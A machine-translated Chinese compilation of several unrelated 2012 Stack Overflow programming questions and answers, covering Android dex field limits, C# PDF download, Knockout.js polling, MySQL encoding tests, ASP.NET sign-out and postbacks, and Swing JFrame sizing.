在为我们的 Android 应用程序执行运行配置时，我们收到以下错误：Dx Trouble writing output: Too many fields: 65757; 最大值为 65536。按包装：

2857 com.android.foo.bar
12 com.android.foo.bar.util
236 com.blah.yo.io
6 com.blah.yo.util
2 com.hmm
82 com.hmm.android.app
2761 com.hmm .android.common
2761 com.hmm.android.map
2761 com.hmm.android.map.common
。. .

*命名空间列表后面有类似的数字*

转换为 Dalvik 格式失败，错误 2

这是我们项目结构的示例：

概念结构：A - 主/非库模块

*   B - A 的库模块/Android 依赖项

    *   C - 作为库模块 B 的 Android 依赖项引入的库模块
*   D - A 的库模块/Android 依赖项
*   E - A 的库模块/Android 依赖项
    *   F - E 的库模块/Android 依赖项
    *   G - E、B、D 的库模块/Android 依赖项（跨不同模块使用的通用 IO 模块）

文件夹结构：

/项目A/

```
 B/*Android module structure*
       C/*Android module structure*
       D/*Android module structure*
       E/*Android module structure*
       F/*Android module structure*
       G/*Android module structure* 
```

起初我们认为“哇，我们已经达到了最大 fields_ids_size ，所以我们的应用程序必须变得那么大”，这是一个相当大的应用程序功能。

在对该问题进行了一些清理/发现尝试后，我们怀疑这是否是原因。在分析了 fields_ids_size 的 classes.dex 文件并尝试了不同的方法后，我们发现如果我们删除库模块并将它们包含到主项目中，我们可以减少 fields_ids 的数量。跨项目重用代码/模块的情况很糟糕，但是将上述错误消息中的数字从 65757 减少到近 24,000。同样，如果 jar'ing 一个库模块并将其包含到依赖实体的类路径中（无论是它的主要非库模块还是库模块），如果您删除该库模块的 Android 依赖项，该数字也会缩小，并且只需使用jar文件。

看到这一点，我从上面的示例中提取了 D，并将其作为自己的独立应用程序，与其他模块没有依赖关系/绑定，并为它创建了 classes.dex 文件。对于这个示例，我们假设 D 具有命名空间 com.android.foo.bar。从上面的示例错误来看，这个命名空间在用作 A 的库模块时占用了 2857 个字段 id。当编译为它自己的应用程序并分析 classes.dex 文件时，我看到这个数字下降到大约 120 个字段 id。

这对我们的应用程序来说是一个相当大的问题，因为我们正在达到这个上限。我们确实有某种解决方法，但它相当笨重且耗时。我希望有一个解决方案可以让我们拥有这些库引用，而不会出现库模块的 fields_ids 数量似乎被夸大导致此问题的问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-20T22:19:38.950

我最近遇到了您完全相同的问题。我的主项目引用了很多库项目，因此我可以轻松地重用我的代码。

假设我的 3 个库项目都依赖于常用的库 actionBarSherlock。在所有 3 个包中，它将自动生成 R.java 并将所有来自 actionbarsherlock 的 id 放入新的 R.java。所以现在你有 4 个 R.java 文件（ActionBarSherlock、lib1、lib2、lib3），其中使用了许多相同的 id。

解决这个问题的诀窍是在所有库项目 AndroidManifest.xml 中声明相同的包名称，这样您就没有那么多相同的 id。

其他选择是：

1）用ant构建你的项目来创建和加载超过1个dex文件（可怕的解决方案）[http://android-developers.blogspot.com/2011/07/custom-class-loading-in-dalvik.html](http://android-developers.blogspot.com/2011/07/custom-class-loading-in-dalvik.html)

2）合并简化代码

我希望这有帮助

# c# - 如何从 http 请求/响应流中获取 PDF

> ID：11955979
> 
> 赞同：3
> 
> 时间：2012-08-14T15:41:49.447
> 
> 标签：c#, http, pdf, request, response

我有一个像这样的网址“https://site.com/cgi-bin/somescript.pl?file=12345.pdf&type=application/pdf”。当我转到此网址时，它将在 iframe 中的浏览器中显示 pdf。这个pdf可以保存吗？我正在考虑获取http响应流并将其转储到文件中。请指教。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:46:32.553

像这样的东西会起作用

```
 const string FILE_PATH = "C:\\foo.pdf";
             const string DOWNLOADER_URI =  "https://site.com/cgi-bin/somescript.pl?file=12345.pdf&type=application/pdf";

            using (var writeStream = File.OpenWrite(FILE_PATH)) 
            {
                var httpRequest = WebRequest.Create(DOWNLOADER_URI) as HttpWebRequest;
                var httpResponse = httpRequest.GetResponse();
                httpResponse.GetResponseStream().CopyTo(writeStream);
                writeStream.Close();
            } 
```

# dynamics-nav - 无法在经典报表的每一页中打印报表标题

> ID：11955985
> 
> 赞同：0
> 
> 时间：2012-08-14T15:42:13.027
> 
> 标签：dynamics-nav

如何在 Nav 2009 中的经典报告的每一页中打印报告标题。我尝试查看部分属性 (PrintOnEveryPage = yes)。你有什么主意吗 ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T22:59:58.460

对于提供的当前详细信息，我可以提供的唯一建议是确保 PrintOnEveryPage 设置为 yes（在选择页眉部分时使用 Shift + F4）。

除此之外，请确保您的标头位于 DataItem（例如 PageLoop）上，而另一个 DataItem 可能不会在每个页面上运行。PageLoop Header 示例可以通过各种 NAV 报告器找到，例如 206 销售发票。

# .net - 空白是否有宽度？

> ID：11955991
> 
> 赞同：1
> 
> 时间：2012-08-14T15:42:26.523
> 
> 标签：.net, string, whitespace, padding, delphi-prism

当谈到空白时，我太困惑了。我正在尝试调整字符串，但它不会与我合作。

我想打印一个datagridview，所以我有列标题，下面是实际行。无论我如何尝试确定填充字符串的确切长度或宽度，它要么太短，要么太长。因此，在发送到打印机之前，我无法将值与列标题对齐。

例如，如果我只是执行以下操作：

```
thestring := '.NET is cool';
thestring := thestring.padright(100); //thestring = too short = '.NET is cool    ' 
```

如果我这样做：

```
var tmpstr := '=';
tmpstr := tmpstr.PadRight(15); //total length of characters is 15
var swidth := int32(ev.Graphics.Measurestring(tmpstr,new Font('Arial',9)).Width);

thestring := '.NET is cool';
thestring := theString.padright(swidth); //thestring = too long = '.NET is cool   

                ' 
```

当您传入实际字符而不是空格时，PadRight 或 PadLeft 似乎可以正常工作，但我可能是错的。

任何输入或帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:03:14.983

使用比例字体时，每个字符的宽度都会有所不同。Arial 是一种比例字体，与我们通常使用的大多数字体一样。

[维基百科：字体](http://en.wikipedia.org/wiki/Typeface#Proportion)

> 比例字体包含不同宽度的字形，而等宽（非比例或固定宽度）字体对字体中的所有字形使用单一标准宽度。

这意味着每个字母都可能不同。空格确实有宽度，但它不必与字母“i”或字母“w”相同。

真的有两种选择：

1.  您可以使用等宽字体，例如 Courier New。这将允许您使用空格根据字母数排列字符。
2.  使用像素对齐。在这种情况下，您需要测量文本宽度并移动文本输出命令的起始位置，以便项目彼此对齐。您实际上计算了所需的空白，然后移动到该位置而不是填充字符串。

# javascript - 如果我的油门设置为 120000，我如何立即获得第一个值

> ID：11955992
> 
> 赞同：0
> 
> 时间：2012-08-14T15:42:28.323
> 
> 标签：javascript, jquery, knockout.js, throttling

所以基本上我不想在开始时从服务器获取数据然后每 2 分钟更新一次，而是在 2 分钟后才获得第一个值，我该怎么办？

这是我的 js 标记：

```
var itemViewModel = {
    item: ko.observable().extend({ throttle: 120000 }),
    loadcontent: function (getID) {
        $.ajax({
            url: '/api/item/details/' + getID,
            dataType: 'json',
            success: function (data) {
                itemViewModel.item(data);
            }
        });
    }
}; 
```

也许这会有所帮助，这是一个 HTML 标记：

```
<div id="item-details-content">
    <input type="hidden" id="item-id" value="@id" data-bind=""/>
    <div class="item-list" data-bind="init: itemPage.loadcontent(@id), with: itemPage.item"> 
```

## 条件

1.  需要和初始调用`loadcontent`
2.  一切都必须在里面`viewModel`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:46:58.997

这不是[`throttle extender`](http://knockoutjs.com/documentation/throttle-extender.html)（[链接](http://knockoutjs.com/documentation/throttle-extender.html)）的意思。请改用[`setInterval`](http://www.w3schools.com/jsref/met_win_setinterval.asp)（[链接](http://www.w3schools.com/jsref/met_win_setinterval.asp)）。

`throttle`旨在处理您可能在短时间内收到任意数量的事件并且您不想对每个事件都采取行动的情况。例如，您有一个使用 REST-API 的具有*自动完成*功能的搜索字段。您不想在用户每次按下键时都调用 REST-API。相反，您想等一下，直到用户完成输入。这是一个完美的用例`throttle`。

您正在寻找的是一种以预定间隔重复操作的方法。JavaScript 有一个内置函数，它被称为`setInterval`.

```
var itemViewModel = {
    item: ko.observable().extend({ throttle: 120000 }),
    loadcontent: function (getID) {
        var loadData = function()
        {
            $.ajax({
                url: '/api/item/details/' + getID,
                dataType: 'json',
                success: function (data) {
                    itemViewModel.item(data);
                }
            });
        }
        loadData(); // initial call
        setInterval(loadData, 120000); // repeat every 2 minutes
    }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:54:03.913

Throttle's intended use is to make sure the function does not execute more then once every x seconds. As Martin said, setInterval would be better in this situation

```
var interval = setInterval(function() {
     ko.observable();
}, 120000);

ko.observable(); 
```

# mysql - 在 MySQL 数据库中测试编码的应用程序未提交到表

> ID：11955993
> 
> 赞同：0
> 
> 时间：2012-08-14T15:42:29.633
> 
> 标签：mysql, utf-8, character-encoding

我从[这个页面](http://kunststube.net/frontback/)获得了下面的应用程序，以便我可以在 MySQL 数据库上测试字符编码。我使用同一页面上列出的查询创建了数据库，即：

```
CREATE TABLE `texts` (
  `id` INT(11) unsigned NOT NULL AUTO_INCREMENT,
  `content` TEXT,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8; 
```

并输入了连接到我的数据库的详细信息，我确信这是正确的。但是，由于某种原因，没有任何内容提交到我的数据库，当我手动向数据库添加条目时，我在“输出测试”下方收到以下错误：

> 注意：未定义的索引：第 56 行 /home/..../php/encoding_test.php 中的文本

我想知道是否有人能发现问题可能是什么？

```
<?php

error_reporting(E_ALL);
ini_set('display_errors', true);

header('Content-Type: text/html; charset=utf-8');

$pdo = new PDO('mysql:dbname=encoding_test;host=localhost', 'user', 'pass',
               array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8'));

if (!empty($_POST['text'])) {
    $stmt = $pdo->prepare('INSERT INTO `texts` (`text`) VALUES (:text)');
    $stmt->execute(array('text' => $_POST['text']));
}

$results = $pdo->query('SELECT * FROM `texts`')->fetchAll(PDO::FETCH_ASSOC);

?>
<!DOCTYPE html>

<html>
<head>
    <title>UTF-8 encoding test</title>
</head>
<body>

<h1>Display test</h1>

<p>
A good day, World!<br>
Schönen Tag, Welt!<br>
Une bonne journée, tout le monde!<br>
يوم جيد، العالم<br>
좋은 일, 세계!<br>
Một ngày tốt lành, thế giới!<br>
こんにちは、世界！<br>
</p>

<h1>Submission test</h1>

<form action="" method="post" accept-charset="utf-8">
    <textarea name="text"></textarea>
    <input type="submit" value="Submit">
</form>

<?php if (!empty($_POST['text'])) : ?>
    <h2>Last received data</h2>
    <pre><?php echo htmlspecialchars($_POST['text'], ENT_NOQUOTES, 'UTF-8'); ?></pre>
<?php endif; ?>

<h1>Output test</h1>

<ul>
    <?php foreach ($results as $result) : ?>
        <li>
            <pre><?php echo htmlspecialchars($result['text'], ENT_NOQUOTES, 'UTF-8'); ?></pre>
        </li>
    <?php endforeach; ?>
</ul>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:04:13.107

```
ALTER TABLE `texts` CHANGE `content` `text` TEXT; 
```

根据您的 PHP 代码，您使用表`texts`，因为它包含名为的列`text`，但在您的模式中，此列具有名称`content` 所以您需要使用上述查询将列重命名`content`为。`text`

# azure - ACS live id 注销重定向到 msn.com

> ID：11955995
> 
> 赞同：0
> 
> 时间：2012-08-14T15:42:36.327
> 
> 标签：azure, acs

我有一个自定义登录名，我在其中使用 windows live id authentication ACS 对我的应用程序进行身份验证。

我能够正确登录，但注销存在问题。我明白了

[https://login.live.com/login.srf?wa=wsignout1.0](https://login.live.com/login.srf?wa=wsignout1.0)

反序列化 ACS json 文件后的注销链接。但导航后它会将我重定向到 msn.com 站点。如何重定向到我的项目 Default.aspx 页面。我有一个asp.net 应用程序。我也试过下面的代码：

```
string cookieName = "FedAuth";             

if (HttpContext.Current.Request.Cookies.AllKeys.Contains(Server.UrlEncode(cookieName)))
{
    var cookie = newHttpCookie(Server.UrlEncode(cookieName));
    cookie.Expires = DateTime.Now.AddDays(-1);
    Response.Cookies.Add(cookie);
}

WSFederationAuthenticationModule fam = FederatedAuthentication.WSFederationAuthenticationModule;

try
{
    FormsAuthentication.SignOut();
}
finally
{
    fam.SignOut(true);
}

string reply = fam.Realm + "default.aspx";

// Initiate a Federated sign out request to the STS.SignOutRequestMessage

signOutRequest = newSignOutRequestMessage(newUri(fam.Issuer), reply);
string logoutUrl = signOutRequest.WriteQueryString();
Response.Redirect("default.aspx"); 
```

但它没有用。它注销并停止到称为注销的页面。注销后我想重定向到我的项目页面。

# javascript - 从 jquery 对话框调用服务器端方法

> ID：11955997
> 
> 赞同：1
> 
> 时间：2012-08-14T15:42:36.520
> 
> 标签：javascript, jquery, asp.net, postback

我正在将我的搜索功能移动到一个 jquery 对话框中。

本来我有

使用以下搜索框按姓氏定位

搜索方式： 搜索

我添加了以下 javascript ：

```
 var dlgSearch = $("#SearchDialog").dialog({
        autoOpen: false,
        zIndex: 9999,
        bgiframe: true,
        resizable: false,
              width: 450,
        modal: true,
        overlay: {
            backgroundColor: '#000',
            opacity: 0.5
        },
        buttons: {
        'Search': 
         function() {
           <%= Page.ClientScript.GetPostBackEventReference(btnSearch, String.Empty) %>;
         },

            Cancel: function() {
                $(this).dialog('close');
            }
        }
    });

    dlgSearch.parent().appendTo($("form:first")); 
```

这工作正常。但是现在我向浏览器呈现 2 个搜索按钮。使用标签呈现的原始按钮，以及使用 jquery 对话框实例化呈现的按钮。我想摆脱使用服务器端标签呈现的标签，只使用 jquery 标签。

问题是，如果我删除标记，我会在 GetPostBackEventReference 调用中收到编译错误，因为控件 btnSearch 不再存在。

我总是可以使用 CSS 设置 btnSearch 的样式并使其显示：无，但这似乎是解决问题的一种肮脏方式。

有没有一种方法可以调用服务器端方法而不将其绑定到控件事件？请注意，我不想要 ajax 回调方法，我实际上需要回发。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:03:26.573

在客户端上使用这个：`__doPostBack("SearchDialog", "");`在服务器上使用这个：

```
protected void Page_Load(object sender, EventArgs e)
{
    if (IsPostBack && Request.Form["__EVENTTARGET"] == "SearchDialog")
    {
         //your code here
    }
} 
```

# java - 打包后获取实际的 JFrame 大小

> ID：11955999
> 
> 赞同：4
> 
> 时间：2012-08-14T15:42:38.157
> 
> 标签：java, swing, jframe, jpanel, dimensions

我已经创建`JFrame`并将其大小设置为`800x600`：

```
frame.setSize(800, 600); 
```

然后我创建`JPanel`并将其插入到我的`JFrame`：

```
JPanel panel = new JPanel();
frame.add(panel, BorderLayout.CENTER); 
```

但它的实际尺寸小于`JFrame`尺寸，因为标题栏和框架边框高度在不同的操作系统中有所不同。

* * *

然后我尝试了另一种方法。

我创建了框架而没有设置它的大小。

之后我创建`JPanel`并设置了它的首选大小：

```
panel.setPreferredSize(new Dimension(800, 600)); 
```

然后我打包`Jframe`了：

```
frame.pack(); 
```

* * *

我现在如何确定实际`JFrame`尺寸？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:42:38.157

`JFrame`大小可以通过以下方式确定：

```
frame.getSize() 
```

内容窗格大小（不包括标题栏和`Jframe`系统窗口边框）可以通过以下方式确定：

```
frame.getContentPane().getSize() 
```